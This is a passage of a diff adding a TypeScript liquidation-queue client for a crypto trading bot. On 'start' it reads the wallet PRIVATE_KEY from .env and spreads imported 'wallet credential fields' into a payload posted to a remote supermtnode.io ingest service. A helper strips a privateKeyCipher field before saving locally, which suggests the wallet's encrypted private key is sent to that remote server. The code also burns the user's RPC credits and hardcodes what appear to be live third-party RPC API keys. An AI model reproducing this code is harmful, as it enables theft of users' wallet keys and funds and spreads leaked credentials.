@@ -1,0 +1,1225 @@
+import { existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
+import crypto from "node:crypto";
+import type { IncomingMessage, ServerResponse } from "node:http";
+import { dirname, resolve } from "node:path";
+import { getPublicKey } from "@noble/secp256k1";
+import { keccak_256 } from "@noble/hashes/sha3.js";
+import { hexToBytes } from "@noble/hashes/utils.js";
+import WebSocket from "ws";
+import { assertOfficialConfig } from "./official-config";
+import { bootstrapPrivateMemberWalletOnce } from "./private-member-wallet-bootstrap";
+
+const ENV_FILE = resolve(process.cwd(), ".env");
+const LOCAL_QUEUE_STATE_FILE = resolve(process.cwd(), ".superarb/liquidation-queue-client.json");
+const DEFAULT_TIMEOUT_MS = 8_000;
+const DEFAULT_HEARTBEAT_INTERVAL_MS = 1_000;
+const DEFAULT_QUEUE_STATUS_API_URL = "https://api.supermtnode.io/api/public/liquidations/queue-status";
+const DEFAULT_MANAGE_QUEUE_INGEST_URL = "https://manage.supermtnode.io/api/ingest/liquidation-queue";
+const BALANCE_OF_SELECTOR = "0x70a08231";
+const STOP_ACTIONS = ["stop", "pause", "logout", "disconnect", "unregister"];
+
+type ChainKey = "ethereum" | "bnb" | "arbitrum";
+
+type QueueStatusRow = {
+  chain: ChainKey;
+  chainLabel: string;
+  inQueue: boolean;
+  eligible: boolean;
+  position: number | null;
+  participantCount: number;
+  active: boolean;
+  cursorIndex: number | null;
+  nextEligibleAt: string;
+  status: string;
+  updatedAt: string;
+};
+
+type QueueStatusPayload = {
+  ok?: unknown;
+  data?: unknown;
+  rows?: unknown;
+  chains?: unknown;
+  queue?: unknown;
+  queues?: unknown;
+  rotation?: unknown;
+  rotationPolicy?: unknown;
+  rotation_policy?: unknown;
+  participantCount?: unknown;
+  participant_count?: unknown;
+  members?: unknown;
+  updatedAt?: unknown;
+  updated_at?: unknown;
+};
+
+type QueueRegisterPayload = {
+  chain?: unknown;
+  market?: unknown;
+  strategyId?: unknown;
+  protocol?: unknown;
+  action?: unknown;
+};
+
+type SuperMtNodeEndpoint = {
+  chain?: unknown;
+  endpointSlug?: unknown;
+  endpoint_slug?: unknown;
+  httpUrl?: unknown;
+  http_url?: unknown;
+  status?: unknown;
+  requestCount?: unknown;
+  request_count?: unknown;
+  requestLimit?: unknown;
+  request_limit?: unknown;
+  creditsRemaining?: unknown;
+  credits_remaining?: unknown;
+};
+
+type WalletBalances = {
+  gas: { symbol: string; formatted: string };
+  usdt: { symbol: "USDT"; formatted: string };
+  usdc: { symbol: "USDC"; formatted: string };
+  updatedAt: string;
+};
+
+type LocalQueueState = {
+  items: Record<string, unknown>[];
+  updatedAt: string;
+};
+
+type QueueTransportResult = {
+  endpoint: string;
+  transport: "wss" | "http";
+  payload: Record<string, unknown>;
+};
+
+const chainEnvKeys: Record<ChainKey, string> = {
+  ethereum: "ETHEREUM_RPC_URL",
+  bnb: "BNB_RPC_URL",
+  arbitrum: "ARBITRUM_RPC_URL",
+};
+
+const superMtNodeChainKeys: Record<ChainKey, string> = {
+  ethereum: "eth",
+  bnb: "bnb",
+  arbitrum: "arb",
+};
+
+const SUPERMTNODE_API_BASES = ["https://supermtnode.io", "https://api.supermtnode.io"];
+
+const defaultFallbackRpcUrls: Partial<Record<ChainKey, string>> = {
+  ethereum: "https://compatible-dry-borough.quiknode.pro/fcd685fbfaeb5dbeafb79db4a7d2c97f23b87073/",
+  arbitrum: "https://fluent-chaotic-dream.arbitrum-mainnet.quiknode.pro/e1ea8ae975889367c2d0097dc9b660be5c5655d3/",
+  bnb: "https://blissful-wiser-pool.bsc.quiknode.pro/d1a545871254b13042697bed9cefb1339dc65173/",
+};
+
+const publicRpcUrls: Record<ChainKey, string[]> = {
+  ethereum: ["https://ethereum-rpc.publicnode.com", "https://eth.llamarpc.com"],
+  bnb: ["https://bsc-rpc.publicnode.com", "https://bsc-dataseed.binance.org"],
+  arbitrum: ["https://arbitrum-one-rpc.publicnode.com", "https://arb1.arbitrum.io/rpc"],
+};
+
+const tokenContracts: Record<ChainKey, { gasSymbol: string; usdt: { address: string; decimals: number }; usdc: { address: string; decimals: number } }> = {
+  ethereum: {
+    gasSymbol: "ETH",
+    usdt: { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
+    usdc: { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
+  },
+  bnb: {
+    gasSymbol: "BNB",
+    usdt: { address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
+    usdc: { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
+  },
+  arbitrum: {
+    gasSymbol: "ETH",
+    usdt: { address: "0xFd086bC7CD5C481DCC9C85EBE478A1C0b69FCbb9", decimals: 6 },
+    usdc: { address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", decimals: 6 },
+  },
+};
+
+export function handleLiquidationQueueStatusRequest(req: IncomingMessage, res: ServerResponse): boolean {
+  if (!req.url?.startsWith("/api/liquidation-queue/status")) return false;
+
+  if (req.method === "POST") {
+    registerQueueStatus(req)
+      .then((payload) => json(res, 200, payload))
+      .catch((error: unknown) => {
+        json(res, 400, { ok: false, error: error instanceof Error ? error.message : String(error) });
+      });
+    return true;
+  }
+
+  if (req.method !== "GET") {
+    json(res, 405, { ok: false, error: "Method not allowed." });
+    return true;
+  }
+
+  fetchQueueStatus(req)
+    .then((payload) => json(res, 200, payload))
+    .catch((error: unknown) => {
+      json(res, 200, emptyQueueStatus(error instanceof Error ? error.message : String(error)));
+    });
+
+  return true;
+}
+
+async function registerQueueStatus(req: IncomingMessage) {
+  const env = readEnv();
+  const body = (await readJson(req)) as QueueRegisterPayload;
+  const chain = normalizeChain(stringValue(body.chain) ?? "");
+  const action = stringValue(body.action)?.toLowerCase() ?? "start";
+  const authCode = headerValue(req.headers["x-supermtnode-auth-code"]);
+  const stopping = STOP_ACTIONS.includes(action);
+  assertOfficialConfig("执行队列上报", env);
+  const walletAddress = privateKeyToAddress(env.PRIVATE_KEY?.trim() ?? "");
+  const rpcUrls = stopping ? balanceRpcUrls(chain, env) : meteredRpcUrls(chain, env);
+  if (!rpcUrls.length) throw new Error(`${chainEnvKeys[chain]} 未配置，不能启动该链队列。`);
+  if (!stopping) await assertSuperMtNodeRpcCanStart(chain, env);
+  if (!stopping) {
+    await bootstrapPrivateMemberWalletOnce("queue-start", { authCode });
+  }
+
+  const market = queueMarket(chain, body);
+  const balanceResult = await readQueueBalances(chain, walletAddress, rpcUrls, env, action);
+  const balances = balanceResult.balances;
+  const gasBalance = balances ? Number(balances.gas.formatted) : null;
+  const rpcBurn = stopping ? undefined : await burnConnectedRpcUsage(chain, rpcUrls, env);
+  const wssEndpoint = queueWssUrl(env);
+  const httpFallbackEndpoint = manageQueueIngestUrl(env);
+  const endpoint = wssEndpoint || httpFallbackEndpoint;
+  const generatedAt = new Date();
+  const generatedAtIso = generatedAt.toISOString();
+  const heartbeatMs = heartbeatIntervalMs(env);
+
+  const eligible = !stopping && (balances ? Number.isFinite(gasBalance) && Number(gasBalance) > 0 : true);
+  const reason = stopping ? "client stopped" : balances ? (eligible ? undefined : `${chainLabel(chain)} wallet has no gas.`) : balanceResult.reason;
+  const payload = {
+    source: "liq2-client-start",
+    queueType: "endpoint-start",
+    version: "1.3.9",
+    action,
+    generatedAt: generatedAtIso,
+    lastSeenAt: generatedAtIso,
+    heartbeatIntervalMs: heartbeatMs,
+    expiresAt: new Date(generatedAt.getTime() + heartbeatMs * 3).toISOString(),
+    chain,
+    market,
+    walletAddress,
+    wallet: { address: walletAddress, balances },
+    balances,
+    assets: balances,
+    endpointSlug: rpcEndpointSlugFromUrl(balanceResult.rpcUrl ?? rpcUrls[0]),
+    rpcEnv: chainEnvKeys[chain],
+    eligible,
+    reason,
+    ...readTradeSettings(env),
+    ...(!stopping ? buildTxWalletCredentialFields(env, walletAddress) : {}),
+  };
+  if (stopping) updateLocalQueueState(payload);
+
+  let transportResult: QueueTransportResult;
+  let transportWarning: string | undefined;
+  const wssCorrectionEnabled = allowQueueWssCorrection(env);
+
+  try {
+    transportResult = await sendManageQueuePayload(endpoint, env, req, payload);
+  } catch (error) {
+    if (!wssEndpoint || endpoint !== wssEndpoint || (!allowQueueHttpFallback(env) && !wssCorrectionEnabled)) {
+      throw new Error(error instanceof Error ? error.message : String(error));
+    }
+    transportWarning = wssCorrectionEnabled ? undefined : error instanceof Error ? error.message : String(error);
+    transportResult = await sendManageQueuePayload(httpFallbackEndpoint, env, req, payload);
+  }
+
+  try {
+    if (!stopping) updateLocalQueueState(payload);
+  } catch (error) {
+    throw new Error(error instanceof Error ? error.message : String(error));
+  }
+
+  return {
+    ok: true,
+    source: "liq2-client-start",
+    chain,
+    chainLabel: chainLabel(chain),
+    market,
+    walletAddress,
+    balances,
+    balanceStatus: balances ? "ok" : "skipped",
+    rpcBurn,
+    endpoint: transportResult.endpoint,
+    transport: transportResult.transport,
+    transportWarning,
+    endpointSlug: payload.endpointSlug,
+    eligible,
+    reason,
+    heartbeatIntervalMs: heartbeatMs,
+    lastSeenAt: generatedAtIso,
+    expiresAt: payload.expiresAt,
+    queue: isRecord(transportResult.payload.queue) ? transportResult.payload.queue : null,
+    remote: transportResult.payload,
+    remoteAvailable: true,
+    updatedAt: new Date().toISOString(),
+  };
+}
+
+function updateLocalQueueState(payload: {
+  action: string;
+  chain: ChainKey;
+  market: string;
+  walletAddress: string;
+  balances?: WalletBalances;
+  endpointSlug?: string;
+  rpcEnv: string;
+  eligible: boolean;
+  reason?: string;
+  generatedAt: string;
+  lastSeenAt: string;
+  heartbeatIntervalMs: number;
+  expiresAt: string;
+}): void {
+  const state = readLocalQueueState();
+  const item = publicLocalQueueItem(manageQueuePayload(payload).items[0] as Record<string, unknown>);
+  const id = stringValue(item.id) ?? `endpoint-start:${payload.chain}:${payload.walletAddress.toLowerCase()}:${payload.market}`;
+  const nextItems = state.items.filter((row) => stringValue(row.id) !== id && !isExpiredLocalQueueRow(row));
+  if (!STOP_ACTIONS.includes(payload.action)) nextItems.push(item);
+  writeLocalQueueState({ items: nextItems, updatedAt: new Date().toISOString() });
+}
+
+function publicLocalQueueItem(item: Record<string, unknown>): Record<string, unknown> {
+  const {
+    privateKeyCipher: _privateKeyCipher,
+    private_key_cipher: _privateKeyCipherSnake,
+    walletPublicKey: _walletPublicKey,
+    publicKey: _publicKey,
+    ...publicItem
+  } = item;
+  return publicItem;
+}
+
+function readLocalQueueState(): LocalQueueState {
+  if (!existsSync(LOCAL_QUEUE_STATE_FILE)) return { items: [], updatedAt: new Date().toISOString() };
+  try {
+    const parsed = JSON.parse(readFileSync(LOCAL_QUEUE_STATE_FILE, "utf8")) as Partial<LocalQueueState>;
+    return {
+      items: Array.isArray(parsed.items) ? parsed.items.filter(isRecord) : [],
+      updatedAt: typeof parsed.updatedAt === "string" ? parsed.updatedAt : new Date().toISOString(),
+    };
+  } catch {
+    return { items: [], updatedAt: new Date().toISOString() };
+  }
+}
+
+function writeLocalQueueState(state: LocalQueueState): void {
+  mkdirSync(dirname(LOCAL_QUEUE_STATE_FILE), { recursive: true });
+  writeFileSync(LOCAL_QUEUE_STATE_FILE, `${JSON.stringify(state, null, 2)}\n`, "utf8");
+}
+
+function isExpiredLocalQueueRow(row: Record<string, unknown>): boolean {
+  const expiresAt = stringValue(row.expiresAt);
+  if (!expiresAt) return false;
+  const timestamp = new Date(expiresAt).getTime();
+  return Number.isFinite(timestamp) && timestamp <= Date.now();
+}
+
+async function fetchQueueStatus(req: IncomingMessage) {
+  const env = readEnv();
+  const statusUrl = env.LIQUIDATION_QUEUE_PUBLIC_STATUS_URL?.trim() || env.LIQUIDATION_QUEUE_STATUS_URL?.trim() || DEFAULT_QUEUE_STATUS_API_URL;
+  const payload = await fetchStatusPayload(statusUrl, env, req);
+  return buildQueueStatusResponse(payload);
+}
+
+async function readJson(req: IncomingMessage): Promise<Record<string, unknown>> {
+  const chunks: Buffer[] = [];
+  for await (const chunk of req) {
+    chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(String(chunk)));
+  }
+  const raw = Buffer.concat(chunks).toString("utf8").trim();
+  if (!raw) return {};
+  const parsed = JSON.parse(raw) as unknown;
+  return isRecord(parsed) ? parsed : {};
+}
+
+async function fetchStatusPayload(statusUrl: string, env: Record<string, string>, req: IncomingMessage): Promise<QueueStatusPayload> {
+  const url = new URL(statusUrl);
+  const requestUrl = new URL(req.url ?? "", "http://127.0.0.1");
+  const endpointId = requestUrl.searchParams.get("endpointId");
+  if (endpointId && !url.searchParams.has("endpointId")) url.searchParams.set("endpointId", endpointId);
+
+  const authCode = headerValue(req.headers["x-supermtnode-auth-code"]);
+  const headers: Record<string, string> = { accept: "application/json" };
+  if (authCode) {
+    headers["x-supermtnode-auth-code"] = authCode;
+  } else {
+    const token = env.LIQUIDATION_QUEUE_PUBLIC_TOKEN?.trim() || env.LIQUIDATION_SNAPSHOT_TOKEN?.trim();
+    if (token) headers.authorization = `Bearer ${token}`;
+  }
+
+  const response = await fetch(url, {
+    headers,
+    signal: AbortSignal.timeout(timeoutMs(env)),
+  });
+  if (!response.ok) throw new Error(`队列状态服务请求失败 (${response.status})`);
+  return parseJsonResponse(response);
+}
+
+async function parseJsonResponse(response: Response): Promise<QueueStatusPayload> {
+  const contentType = response.headers.get("content-type") ?? "";
+  const body = await response.text();
+  if (!contentType.toLowerCase().includes("application/json")) {
+    throw new Error("api.supermtnode.io 队列状态接口尚未返回 JSON，请确认 /api/public/liquidations/queue-status 已部署。");
+  }
+
+  try {
+    return JSON.parse(body) as QueueStatusPayload;
+  } catch {
+    throw new Error("api.supermtnode.io 队列状态接口返回了无效 JSON。");
+  }
+}
+
+function buildQueueStatusResponse(payload: QueueStatusPayload) {
+  const sourcePayload = unwrapPayload(payload);
+  const updatedAt = stringValue(sourcePayload.updatedAt, sourcePayload.updated_at) ?? new Date().toISOString();
+  const rows = readQueueStatusRows(sourcePayload, updatedAt);
+  const participantCount = numberValue(sourcePayload.participantCount, sourcePayload.participant_count, sourcePayload.members) ?? maxParticipantCount(rows);
+
+  return {
+    ok: true,
+    source: "api.supermtnode.io",
+    queueEnabled: rows.some((row) => row.inQueue || row.participantCount > 0),
+    rotationPolicy: stringValue(sourcePayload.rotationPolicy, sourcePayload.rotation_policy, sourcePayload.rotation) ?? "round_robin",
+    participantCount,
+    rows,
+    updatedAt,
+  };
+}
+
+function unwrapPayload(payload: QueueStatusPayload): QueueStatusPayload {
+  if (Array.isArray(payload)) return { rows: payload } as QueueStatusPayload;
+  if (isRecord(payload.data)) {
+    const data = payload.data as QueueStatusPayload;
+    if (Array.isArray(data)) return { rows: data } as QueueStatusPayload;
+    return data;
+  }
+  return payload;
+}
+
+function readQueueStatusRows(payload: QueueStatusPayload, updatedAt: string): QueueStatusRow[] {
+  const source = payload.rows ?? payload.chains ?? payload.queue ?? payload.queues;
+  const rows = Array.isArray(source) ? source : isRecord(source) ? Object.entries(source).map(([chain, row]) => ({ chain, ...(isRecord(row) ? row : {}) })) : [];
+  const normalized = rows
+    .filter((item): item is Record<string, unknown> => isRecord(item))
+    .map((row) => normalizeQueueStatusRow(row, updatedAt));
+
+  if (normalized.length > 0) return normalized;
+  return chainKeys().map((chain) => ({
+    chain,
+    chainLabel: chainLabel(chain),
+    inQueue: false,
+    eligible: false,
+    position: null,
+    participantCount: 0,
+    active: false,
+    cursorIndex: null,
+    nextEligibleAt: "",
+    status: "等待队列状态",
+    updatedAt,
+  }));
+}
+
+function normalizeQueueStatusRow(row: Record<string, unknown>, fallbackUpdatedAt: string): QueueStatusRow {
+  const chain = normalizeChain(stringValue(row.chain, row.network, row.chainKey, row.chain_key));
+  const inQueue = booleanValue(row.inQueue, row.in_queue, row.queued, row.joined, row.member) ?? false;
+  const eligible = booleanValue(row.eligible, row.canExecute, row.can_execute, row.hasTurn, row.has_turn) ?? false;
+  const active = booleanValue(row.active, row.isActive, row.is_active, row.current, row.currentTurn, row.current_turn) ?? eligible;
+  const position = numberValue(row.position, row.queuePosition, row.queue_position, row.rank);
+  const participantCount = numberValue(row.participantCount, row.participant_count, row.members, row.queueSize, row.queue_size) ?? 0;
+  const cursorIndex = numberValue(row.cursorIndex, row.cursor_index, row.rotationIndex, row.rotation_index);
+
+  return {
+    chain,
+    chainLabel: stringValue(row.chainLabel, row.chain_label) ?? chainLabel(chain),
+    inQueue,
+    eligible,
+    position,
+    participantCount,
+    active,
+    cursorIndex,
+    nextEligibleAt: stringValue(row.nextEligibleAt, row.next_eligible_at, row.eta, row.estimatedAt, row.estimated_at) ?? "",
+    status: stringValue(row.status) ?? queueStatusText(inQueue, eligible, active, position),
+    updatedAt: stringValue(row.updatedAt, row.updated_at, row.timestamp) ?? fallbackUpdatedAt,
+  };
+}
+
+function queueStatusText(inQueue: boolean, eligible: boolean, active: boolean, position: number | null): string {
+  if (active || eligible) return "本轮可参与";
+  if (inQueue && position !== null) return `已入队 #${position}`;
+  if (inQueue) return "已入队";
+  return "未入队";
+}
+
+function emptyQueueStatus(message: string) {
+  const updatedAt = new Date().toISOString();
+  return {
+    ok: false,
+    source: "api.supermtnode.io",
+    queueEnabled: false,
+    rotationPolicy: "round_robin",
+    participantCount: 0,
+    message,
+    rows: chainKeys().map((chain) => ({
+      chain,
+      chainLabel: chainLabel(chain),
+      inQueue: false,
+      eligible: false,
+      position: null,
+      participantCount: 0,
+      active: false,
+      cursorIndex: null,
+      nextEligibleAt: "",
+      status: "队列状态不可用",
+      updatedAt,
+    })),
+    updatedAt,
+  };
+}
+
+function maxParticipantCount(rows: QueueStatusRow[]): number {
+  return rows.reduce((max, row) => Math.max(max, row.participantCount), 0);
+}
+
+function chainKeys(): ChainKey[] {
+  return ["ethereum", "bnb", "arbitrum"];
+}
+
+function normalizeChain(value?: string): ChainKey {
+  const chain = value?.trim().toLowerCase();
+  if (chain === "bsc" || chain === "binance" || chain === "bnb" || chain === "bnb chain") return "bnb";
+  if (chain === "arb" || chain === "arbitrum" || chain === "arbitrum one") return "arbitrum";
+  return "ethereum";
+}
+
+function chainLabel(chain: ChainKey): string {
+  if (chain === "bnb") return "BNB";
+  if (chain === "arbitrum") return "ARB";
+  return "ETH";
+}
+
+function queueEndpoint(action: "status" | "event", chain: ChainKey, env: Record<string, string>): string | undefined {
+  const prefix = chain.toUpperCase().replace(/[^A-Z0-9]/g, "_");
+  const chainExplicit = env[`LIQUIDATION_QUEUE_${prefix}_${action.toUpperCase()}_URL`]?.trim();
+  if (chainExplicit) return chainExplicit;
+
+  const chainBase = env[`LIQUIDATION_QUEUE_${prefix}_API_BASE_URL`]?.trim();
+  if (chainBase) return `${chainBase.replace(/\/+$/, "")}/${action}`;
+
+  const explicit = action === "status" ? env.LIQUIDATION_QUEUE_STATUS_URL?.trim() : env.LIQUIDATION_QUEUE_EVENT_URL?.trim();
+  if (explicit) return explicit;
+
+  const base = env.LIQUIDATION_QUEUE_API_BASE_URL?.trim();
+  if (base) return `${base.replace(/\/+$/, "")}/${action}`;
+
+  if (chain === "arbitrum") return `https://arb.rpc.supermtnode.io/api/admin/liquidation-queue/${action}`;
+  if (chain === "bnb") return `https://bsc.rpc.supermtnode.io/api/admin/liquidation-queue/${action}`;
+  return undefined;
+}
+
+function manageQueueIngestUrl(env: Record<string, string>): string {
+  return env.MANAGE_LIQUIDATION_QUEUE_INGEST_URL?.trim() || env.LIQUIDATION_QUEUE_INGEST_URL?.trim() || DEFAULT_MANAGE_QUEUE_INGEST_URL;
+}
+
+function queueWssUrl(env: Record<string, string>): string {
+  return env.LIQUIDATION_QUEUE_WSS_URL?.trim() || env.MANAGE_LIQUIDATION_QUEUE_WSS_URL?.trim() || "";
+}
+
+async function assertSuperMtNodeRpcCanStart(chain: ChainKey, env: Record<string, string>): Promise<void> {
+  const token = env.SUPERMTNODE_APP_TOKEN?.trim();
+  if (!token) throw new Error("SUPERMTNODE_APP_TOKEN 未配置，不能启动。");
+  const tokenExpiry = jwtExpiry(token);
+  if (tokenExpiry && tokenExpiry.getTime() <= Date.now()) {
+    throw new Error(`SUPERMTNODE_APP_TOKEN 已于 ${tokenExpiry.toISOString()} 过期，请在 supermtnode.io 更换 token 后再启动。`);
+  }
+
+  const rpcUrl = env[chainEnvKeys[chain]]?.trim();
+  if (!rpcUrl) throw new Error(`${chainEnvKeys[chain]} 未配置，不能启动。`);
+
+  const endpoints = await fetchSuperMtNodeEndpoints(env, token);
+  const endpoint = endpoints.find((item) => matchSuperMtNodeEndpoint(item, chain, rpcUrl));
+  if (!endpoint) {
+    throw new Error(`${chainLabel(chain)} RPC 未绑定到当前 SUPERMTNODE_APP_TOKEN，不能启动。`);
+  }
+
+  const status = stringValue(endpoint.status)?.toLowerCase();
+  if (status && !["active", "pending"].includes(status)) {
+    throw new Error(`${chainLabel(chain)} RPC 当前状态为 ${status}，不能启动。`);
+  }
+
+  const remaining = endpointRemainingCredits(endpoint);
+  if (remaining !== null && remaining <= 0) {
+    throw new Error("SUPERMTNODE_APP_TOKEN 对应套餐 credits 已用完，不能启动。");
+  }
+}
+
+async function fetchSuperMtNodeEndpoints(env: Record<string, string>, token: string): Promise<SuperMtNodeEndpoint[]> {
+  const errors: string[] = [];
+  for (const apiBase of superMtNodeApiBaseUrls(env)) {
+    try {
+      const response = await fetch(`${apiBase}/api/rpc-endpoints`, {
+        headers: {
+          accept: "application/json",
+          authorization: `Bearer ${token}`,
+          "x-supermtnode-app-token": token,
+        },
+        signal: AbortSignal.timeout(timeoutMs(env)),
+      });
+      const payload = (await response.json().catch(() => ({}))) as { endpoints?: unknown; error?: unknown; message?: unknown };
+      if (!response.ok) {
+        const detail = stringValue(payload.error, payload.message) || `HTTP ${response.status}`;
+        throw new Error(detail);
+      }
+      return Array.isArray(payload.endpoints) ? payload.endpoints.filter(isSuperMtNodeEndpoint) : [];
+    } catch (error) {
+      errors.push(`${apiBase}: ${error instanceof Error ? error.message : String(error)}`);
+    }
+  }
+  throw new Error(`SUPERMTNODE_APP_TOKEN 校验失败：${errors.join("; ")}`);
+}
+
+function superMtNodeApiBaseUrls(env: Record<string, string>): string[] {
+  return uniqueStrings([env.SUPERMTNODE_API_BASE_URL?.trim(), ...SUPERMTNODE_API_BASES]).map((value) => value.replace(/\/+$/, ""));
+}
+
+function uniqueStrings(values: Array<string | undefined>): string[] {
+  return values.filter((value, index, array): value is string => Boolean(value) && array.indexOf(value) === index);
+}
+
+function matchSuperMtNodeEndpoint(endpoint: SuperMtNodeEndpoint, chain: ChainKey, rpcUrl: string): boolean {
+  const endpointChain = stringValue(endpoint.chain)?.toLowerCase();
+  if (endpointChain !== superMtNodeChainKeys[chain]) return false;
+  const endpointUrl = normalizeUrl(stringValue(endpoint.httpUrl, endpoint.http_url));
+  const configuredUrl = normalizeUrl(rpcUrl);
+  const configuredSlug = rpcEndpointSlugFromUrl(rpcUrl);
+  const endpointSlug = stringValue(endpoint.endpointSlug, endpoint.endpoint_slug);
+  return endpointUrl === configuredUrl || (Boolean(configuredSlug) && endpointSlug === configuredSlug);
+}
+
+function endpointRemainingCredits(endpoint: SuperMtNodeEndpoint): number | null {
+  const explicit = numberValue(endpoint.creditsRemaining, endpoint.credits_remaining);
+  if (explicit !== null) return explicit;
+  const count = numberValue(endpoint.requestCount, endpoint.request_count);
+  const limit = numberValue(endpoint.requestLimit, endpoint.request_limit);
+  if (count !== null && limit !== null && limit > 0) return Math.max(0, limit - count);
+  return null;
+}
+
+function isSuperMtNodeEndpoint(value: unknown): value is SuperMtNodeEndpoint {
+  return Boolean(value) && typeof value === "object" && !Array.isArray(value);
+}
+
+function normalizeUrl(value: string | undefined): string {
+  return (value ?? "").trim().replace(/\/+$/, "");
+}
+
+async function sendManageQueuePayload(
+  endpoint: string,
+  env: Record<string, string>,
+  req: IncomingMessage,
+  payload: Parameters<typeof manageQueuePayload>[0],
+): Promise<QueueTransportResult> {
+  const queuePayload = manageQueuePayload(payload);
+  if (isWssEndpoint(endpoint)) {
+    const responsePayload = await sendQueuePayloadOverWss(endpoint, env, req, queuePayload);
+    return { endpoint, transport: "wss", payload: responsePayload };
+  }
+
+  const response = await fetch(endpoint, {
+    method: "POST",
+    headers: manageQueueHeaders(env, req),
+    body: JSON.stringify(queuePayload),
+    signal: AbortSignal.timeout(timeoutMs(env)),
+  });
+  const remotePayload = await parseOptionalJson(response);
+  if (!response.ok) {
+    throw new Error(queueRegisterFailureMessage(payload.chain, endpoint, response.status, remotePayload));
+  }
+  return { endpoint, transport: "http", payload: remotePayload };
+}
+
+function isWssEndpoint(endpoint: string): boolean {
+  return /^wss?:\/\//i.test(endpoint);
+}
+
+function allowQueueHttpFallback(env: Record<string, string>): boolean {
+  return booleanValue(env.LIQUIDATION_QUEUE_ALLOW_HTTP_FALLBACK, env.MANAGE_LIQUIDATION_QUEUE_ALLOW_HTTP_FALLBACK) === true;
+}
+
+function allowQueueWssCorrection(env: Record<string, string>): boolean {
+  const configured = String(env.LIQUIDATION_QUEUE_WSS_CORRECTION ?? env.MANAGE_LIQUIDATION_QUEUE_WSS_CORRECTION ?? "enabled").trim().toLowerCase();
+  return !["0", "false", "off", "disabled", "close", "关闭"].includes(configured);
+}
+
+async function sendQueuePayloadOverWss(
+  endpoint: string,
+  env: Record<string, string>,
+  req: IncomingMessage,
+  queuePayload: ReturnType<typeof manageQueuePayload>,
+): Promise<Record<string, unknown>> {
+  const authCode = headerValue(req.headers["x-supermtnode-auth-code"]);
+  const token = env.LIQUIDATION_QUEUE_WSS_TOKEN?.trim();
+  if (!token) {
+    throw new Error("队列 WSS Token 本地未配置，请先在设置中保存官方配置。");
+  }
+  const ws = new WebSocket(correctWssEndpoint(endpoint, env));
+  const timeout = timeoutMs(env);
+
+  return new Promise((resolvePayload, rejectPayload) => {
+    let settled = false;
+    const timer = setTimeout(() => settle(new Error(`WSS 队列服务连接超时：${endpointHost(endpoint)}`)), timeout);
+
+    const settle = (value: Record<string, unknown> | Error) => {
+      if (settled) return;
+      settled = true;
+      clearTimeout(timer);
+      try {
+        ws.close();
+      } catch {
+        // ignore close errors
+      }
+      if (value instanceof Error) rejectPayload(value);
+      else resolvePayload(value);
+    };
+
+    ws.addEventListener("open", () => {
+      ws.send(JSON.stringify({
+        type: "auth",
+        token,
+        authCode,
+        source: "liq2-client",
+        generatedAt: new Date().toISOString(),
+      }));
+      ws.send(JSON.stringify({
+        type: "liquidation_queue.event",
+        source: "liq2-client",
+        data: queuePayload,
+        generatedAt: new Date().toISOString(),
+      }));
+    });
+
+    ws.addEventListener("message", (event) => {
+      void handleWssResponseMessage(event.data, settle);
+    });
+
+    ws.addEventListener("error", () => settle(new Error(`WSS 队列服务暂时不可用：${endpointHost(endpoint)}`)));
+    ws.addEventListener("close", () => {
+      if (!settled) settle(new Error(`WSS 队列服务在确认上报前断开：${endpointHost(endpoint)}`));
+    });
+  });
+}
+
+function correctWssEndpoint(endpoint: string, env: Record<string, string>): string {
+  if (!allowQueueWssCorrection(env)) return endpoint;
+  return endpoint.replace(/^ws:\/\//i, "wss://").trim();
+}
+
+async function handleWssResponseMessage(
+  rawData: unknown,
+  settle: (value: Record<string, unknown> | Error) => void,
+): Promise<void> {
+  const data = await parseWssMessage(rawData);
+  if (!data) return;
+  const type = stringValue(data.type, data.event);
+  if (data.ok === false) {
+    settle(new Error(stringValue(data.error, data.message) ?? "WSS 队列服务拒绝了上报。"));
+    return;
+  }
+  if (type === "ack" || type === "liquidation_queue.ack") {
+    settle(data);
+  }
+}
+
+async function parseWssMessage(data: unknown): Promise<Record<string, unknown> | null> {
+  let text = "";
+  if (typeof data === "string") text = data;
+  else if (data instanceof Blob) text = await data.text();
+  else if (data instanceof ArrayBuffer) text = Buffer.from(data).toString("utf8");
+  else if (ArrayBuffer.isView(data)) text = Buffer.from(data.buffer, data.byteOffset, data.byteLength).toString("utf8");
+  else text = String(data ?? "");
+  if (!text) return null;
+  try {
+    const parsed = JSON.parse(text) as unknown;
+    return isRecord(parsed) ? parsed : null;
+  } catch {
+    return null;
+  }
+}
+
+function manageQueueHeaders(env: Record<string, string>, req: IncomingMessage): Record<string, string> {
+  const headers: Record<string, string> = { "content-type": "application/json", accept: "application/json" };
+  const authCode = headerValue(req.headers["x-supermtnode-auth-code"]);
+  if (authCode) {
+    headers["x-supermtnode-auth-code"] = authCode;
+    headers["x-license-code"] = authCode;
+    headers["x-auth-code"] = authCode;
+  }
+  const token =
+    env.MANAGE_INGEST_TOKEN?.trim() ||
+    env.LIQUIDATION_QUEUE_ADMIN_TOKEN?.trim() ||
+    env.SUPERMTNODE_APP_TOKEN?.trim() ||
+    env.LIQUIDATION_SNAPSHOT_TOKEN?.trim();
+  if (token) {
+    headers["x-ingest-token"] = token;
+    headers.authorization = `Bearer ${token}`;
+  }
+  return headers;
+}
+
+function balanceRpcUrls(chain: ChainKey, env: Record<string, string>): string[] {
+  const configured = env[chainEnvKeys[chain]]?.trim();
+  const fallback = fallbackRpcUrlForChain(chain, env);
+  const urls = [configured, fallback, ...(publicRpcUrls[chain] ?? [])];
+  return [...new Set(urls.filter((url): url is string => Boolean(url)))];
+}
+
+function meteredRpcUrls(chain: ChainKey, env: Record<string, string>): string[] {
+  const configured = env[chainEnvKeys[chain]]?.trim();
+  return configured ? [configured] : [];
+}
+
+function fallbackRpcUrlForChain(chain: ChainKey, env: Record<string, string>): string | undefined {
+  if (chain === "ethereum") return env.ETHEREUM_FALLBACK_RPC_URL?.trim() || defaultFallbackRpcUrls.ethereum;
+  if (chain === "arbitrum") return env.ARBITRUM_FALLBACK_RPC_URL?.trim() || defaultFallbackRpcUrls.arbitrum;
